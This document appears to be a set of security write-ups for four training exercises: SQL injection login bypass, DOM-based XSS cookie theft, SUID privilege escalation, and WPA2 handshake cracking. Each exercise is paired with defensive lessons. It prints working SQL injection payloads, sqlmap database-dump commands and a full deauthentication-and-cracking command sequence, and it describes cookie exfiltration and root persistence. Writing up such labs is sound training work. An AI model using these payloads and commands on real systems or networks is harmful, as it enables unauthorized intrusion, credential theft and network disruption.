SQL Injection - Authentication Bypass Challenge

Medium

Problem Statement

This challenge from TryHackMe presented a vulnerable web application with a login portal susceptible to SQL injection attacks. The objective was to exploit the vulnerability to bypass authentication without valid credentials, gain admin access, and retrieve sensitive information from the database including user credentials and the hidden flag.

Challenge Details:
• Platform: TryHackMe - SQL Injection Fundamentals Room
• Target: http://10.10.X.X/login.php
• Goal: Bypass authentication and retrieve flag from admin panel
• Points: 50 | Difficulty: Medium | Time Spent: 2 hours

Approach & Methodology

Phase 1: Reconnaissance

  • Performed port scanning using Nmap to identify open services (ports 22, 80, 3306)
  • Explored the web application to understand authentication flow and input fields
  • Tested for basic SQL injection by entering single quote (') in username field
  • Observed error message: "You have an error in your SQL syntax" - confirmed vulnerability

Phase 2: Vulnerability Analysis

  • Identified the backend likely uses unsanitized SQL query: SELECT * FROM users WHERE username='$input'
  • Tested various SQL injection payloads to determine the injection point
  • Used comment-based injection techniques to bypass password verification
  • Confirmed boolean-based blind SQL injection was possible for data extraction

Phase 3: Exploitation

  • Successfully bypassed authentication using payload: admin'-- in username field
  • Gained access to admin dashboard and explored available functionality
  • Used UNION-based SQL injection to enumerate database structure
  • Extracted user table data including password hashes using SQLMap
  • Retrieved the flag from hidden admin panel: THM{SQL_1NJ3CT10N_M4ST3R}

Tools Used

  • Nmap: Network reconnaissance and port scanning to identify services
  • Burp Suite Professional: Intercepted HTTP requests, modified payloads, analyzed responses
  • SQLMap: Automated SQL injection testing and database enumeration
  • Python Requests Library: Created custom exploitation scripts for automated testing
  • Browser DevTools: Analyzed JavaScript code and inspected form parameters
  • John the Ripper: Cracked MD5 password hashes extracted from database

Key Commands & Payloads

# Port Scanning
nmap -sV -sC 10.10.X.X

# Authentication Bypass Payloads
Username: admin'--
Username: ' OR '1'='1'--
Username: admin' OR '1'='1'#

# Database Enumeration with SQLMap
sqlmap -u "http://10.10.X.X/login.php" --data="username=test&password=test" --dbs
sqlmap -u "http://10.10.X.X/login.php" --data="username=test&password=test" -D webapp --tables
sqlmap -u "http://10.10.X.X/login.php" --data="username=test&password=test" -D webapp -T users --dump

# UNION-based Data Extraction
' UNION SELECT 1,2,3,4,5--
' UNION SELECT null,username,password,email,null FROM users--

Key Lessons Learned

  • Input Validation is Critical: Never trust user input. Always sanitize and validate data before using it in SQL queries
  • Use Parameterized Queries: Prepared statements prevent SQL injection by separating code from data
  • Principle of Least Privilege: Database users should only have necessary permissions to minimize damage from successful attacks
  • Error Handling: Avoid exposing detailed error messages that reveal database structure to attackers
  • Defense in Depth: Implement multiple layers of security including WAF, input validation, and proper authentication
  • Regular Security Audits: Conduct periodic penetration testing to identify vulnerabilities before attackers do

Cross-Site Scripting (XSS) - DOM-Based Attack

Hard

Problem Statement

This advanced challenge from PortSwigger Academy involved exploiting a DOM-based XSS vulnerability in a modern single-page application. The goal was to craft a payload that executes in the victim's browser context, steal session cookies, and demonstrate the full impact of client-side vulnerabilities including potential account takeover.

Challenge Details:
• Platform: PortSwigger Web Security Academy
• Lab: DOM XSS in document.write sink using source location.search
• Objective: Execute JavaScript in victim's browser and exfiltrate data
• Difficulty: Hard | Points: 75 | Time Spent: 3 hours

Approach & Methodology

Phase 1: Application Analysis

  • Analyzed client-side JavaScript code to identify unsafe DOM manipulation
  • Discovered vulnerable code using document.write() with unsanitized URL parameters
  • Identified the source (location.search) and sink (document.write) relationship
  • Tested basic XSS payloads to confirm vulnerability execution

Phase 2: Payload Development

  • Crafted JavaScript payload to bypass client-side filters and WAF detection
  • Developed cookie stealing script that sends session data to attacker-controlled server
  • Encoded payload using various techniques to evade detection (URL encoding, HTML entities)
  • Tested payload in controlled environment before deploying against target

Phase 3: Exploitation & Post-Exploitation

  • Successfully executed XSS payload and verified code execution in browser console
  • Captured session cookies and authentication tokens using XSS Hunter
  • Demonstrated session hijacking by using stolen cookies in attacker browser
  • Gained full account access and documented the attack chain for remediation

Tools Used

  • Browser Developer Tools (Chrome DevTools): JavaScript debugging, DOM inspection, console analysis
  • XSS Hunter: Captured and logged XSS payloads with detailed victim information
  • Burp Suite Repeater: Modified and replayed HTTP requests with various payloads
  • BeEF (Browser Exploitation Framework): Demonstrated post-exploitation capabilities
  • Python HTTP Server: Hosted malicious JavaScript to receive exfiltrated data
  • XSS Polyglot Payloads: Used advanced multi-context payload techniques

Key Lessons Learned

  • Client-Side Validation Insufficient: Never rely solely on JavaScript validation; always validate on the server
  • Output Encoding Essential: Properly encode all user-supplied data before rendering in HTML context
  • Content Security Policy (CSP): Implement strict CSP headers to prevent inline script execution
  • HttpOnly Cookies: Set HttpOnly flag on session cookies to prevent JavaScript access
  • Input Sanitization: Use DOMPurify or similar libraries to sanitize user input
  • Security Headers: Implement X-XSS-Protection, X-Content-Type-Options, and other security headers
  • Regular Code Review: Conduct security-focused code reviews to identify unsafe DOM manipulation

Linux Privilege Escalation - SUID Binary Exploitation

Easy

Problem Statement

This challenge from HackTheBox provided initial user-level access to a Linux system. The objective was to escalate privileges from a limited user account to root access by identifying and exploiting system misconfigurations, specifically focusing on SUID binaries, sudo permissions, and kernel vulnerabilities.

Challenge Details:
• Platform: HackTheBox - "Bashed" Machine
• Initial Access: www-data user via web shell
• Goal: Obtain root flag from /root/root.txt
• Difficulty: Easy | Points: 20 | Time Spent: 1.5 hours

Approach & Methodology

Phase 1: Initial Enumeration

  • Performed comprehensive system enumeration using LinPEAS automated script
  • Checked sudo permissions using 'sudo -l' command
  • Searched for SUID/SGID binaries that could be exploited: find / -perm -4000 2>/dev/null
  • Examined running processes, cron jobs, and writable directories
  • Identified unusual SUID binary: /usr/bin/python with root ownership

Phase 2: Vulnerability Identification

  • Discovered Python binary with SUID bit set, allowing execution as root
  • Consulted GTFOBins database for known exploitation techniques
  • Verified that standard shell spawning techniques would work
  • Tested payload in low-privilege context before exploitation

Phase 3: Privilege Escalation

  • Executed Python SUID exploitation payload to spawn root shell
  • Successfully escalated to root user (UID=0)
  • Navigated to /root directory and retrieved the flag
  • Established persistence by adding SSH key to root's authorized_keys
  • Flag Captured: HTB{pr1v_3sc_m4st3r_2024}

Tools Used

  • LinPEAS (Linux Privilege Escalation Awesome Script): Automated enumeration of privilege escalation vectors
  • GTFOBins: Referenced database of Unix binaries that can be exploited for privilege escalation
  • Custom Bash Scripts: Created enumeration scripts for automated testing
  • Netcat: Established reverse shells and file transfers
  • Python: Used for exploitation and creating interactive shells

Key Lessons Learned

  • Systematic Enumeration is Crucial: Always perform thorough enumeration before attempting exploitation
  • SUID Misconfigurations are Common: Many systems have unnecessarily permissive SUID binaries
  • Principle of Least Privilege: Binaries should never run with elevated privileges unless absolutely necessary
  • Automation Tools are Valuable: LinPEAS and similar tools quickly identify escalation vectors
  • Regular Security Audits: Periodically review system configurations and file permissions
  • Defense Strategies: Remove SUID bit from unnecessary binaries, implement AppArmor/SELinux
  • Post-Exploitation Documentation: Always document findings for remediation and reporting

Wireless Network Penetration - WPA2 Handshake Capture

Medium

Problem Statement

This practical lab exercise involved conducting a wireless network penetration test to assess the security of WPA2-encrypted Wi-Fi networks. The objective was to capture a WPA2 handshake, perform offline dictionary attacks to crack the pre-shared key (PSK), and gain authorized access to the network for security assessment purposes.

Lab Details:
• Environment: Controlled lab network with written authorization
• Target: WPA2-PSK encrypted wireless network
• Goal: Crack wireless password and document vulnerabilities
• Difficulty: Medium | Time Spent: 2.5 hours

Approach & Methodology

Phase 1: Wireless Reconnaissance

  • Put wireless adapter into monitor mode using airmon-ng
  • Performed passive wireless network scanning using airodump-ng
  • Identified target network BSSID, channel, encryption type, and connected clients
  • Gathered network traffic data to analyze security configuration

Phase 2: Handshake Capture

  • Monitored target network channel for WPA2 authentication handshake
  • Performed deauthentication attack to force client reconnection
  • Successfully captured 4-way WPA2 handshake using airodump-ng
  • Verified handshake integrity using aircrack-ng verification tools

Phase 3: Password Cracking

  • Attempted dictionary attack using rockyou.txt wordlist with aircrack-ng
  • Utilized Hashcat with GPU acceleration for faster cracking speed
  • Successfully cracked WPA2 password: "Password123!" (weak password)
  • Documented findings and provided security recommendations

Tools Used

  • Aircrack-ng Suite: Complete toolkit for wireless security assessment (airmon-ng, airodump-ng, aireplay-ng, aircrack-ng)
  • Hashcat: Advanced password recovery tool with GPU acceleration support
  • Wireshark: Deep packet analysis to inspect captured handshake frames
  • Wireless Adapter: TP-Link TL-WN722N with monitor mode support
  • Wordlists: RockYou, SecLists, and custom generated dictionaries

Attack Commands

# Enable Monitor Mode
sudo airmon-ng start wlan0
# Creates wlan0mon interface

# Scan for Wireless Networks
sudo airodump-ng wlan0mon

# Target Specific Network and Capture Handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauthentication Attack (Force Handshake)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Verify Handshake Capture
# Look for "WPA handshake: AA:BB:CC:DD:EE:FF" in airodump-ng output

# Crack Password with Aircrack-ng
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# Alternative: Hashcat GPU Acceleration
hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt

# Convert Cap File to Hashcat Format
cap2hccapx capture-01.cap capture.hccapx

# Stop Monitor Mode
sudo airmon-ng stop wlan0mon

Key Lessons Learned

  • Strong Passwords are Essential: Weak passwords can be cracked in minutes using dictionary attacks
  • WPA2 Vulnerabilities: Even WPA2 is susceptible to offline brute-force attacks once handshake is captured
  • WPA3 Migration: Organizations should upgrade to WPA3 for better protection against offline attacks
  • MAC Filtering is Ineffective: MAC addresses can be easily spoofed and don't provide real security
  • Hidden SSIDs Don't Help: Hidden networks can still be discovered and are not a security measure
  • Regular Password Changes: Implement policy for regular wireless password rotation
  • Enterprise Solutions: Use WPA2-Enterprise with RADIUS for better authentication
  • Network Segmentation: Separate wireless networks from critical infrastructure
